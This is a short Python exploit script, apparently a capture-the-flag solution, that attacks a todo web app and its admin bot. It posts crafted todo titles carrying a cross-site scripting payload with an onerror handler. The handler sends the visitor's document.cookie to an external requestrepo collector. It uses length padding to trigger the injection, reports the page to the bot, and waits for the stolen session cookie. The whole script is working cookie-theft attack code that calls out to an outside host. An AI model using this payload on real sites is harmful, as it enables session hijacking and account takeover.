from requestrepo import RequestRepo
import requests
import os

APP_URL = os.environ.get("APP_URL", "http://localhost:3000/")
BOT_URL = os.environ.get("BOT_URL", "http://localhost:1337/")

repo = RequestRepo()

requestrepo_page = f"http://{repo.subdomain}.{repo.domain}/"

s = requests.session()

r = s.get(APP_URL)
sessionId = s.cookies["sessionId"]

s.post(f"{APP_URL}todos", data={
    "title": f"\" onerror=document.location.assign('{requestrepo_page}?'+document.cookie) "
})
payload = '<p><p><img src="x">'
s.post(f"{APP_URL}todos", data={
    "title": ("a" * (254-len(payload))) + payload
})
print(sessionId)

requests.post(f"{BOT_URL}api/report", json={
    "path": f"?sessionId={sessionId}"
})

req = repo.wait_for_http(timeout=30)
print(req.query)
